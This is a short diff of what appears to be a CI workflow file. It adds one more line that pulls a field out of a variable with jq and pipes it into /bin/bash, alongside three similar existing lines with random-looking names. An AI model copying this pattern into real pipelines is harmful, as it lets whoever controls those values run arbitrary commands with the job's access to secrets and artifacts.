@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$egsva73536" | jq -r .xq0282 | /bin/bash
           printf '%s' "$pt642" | jq -r .a6553 | /bin/bash
           printf '%s' "$cctm691" | jq -r .vrpil2 | /bin/bash
+          echo $ch0 | jq -r .txm17852 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
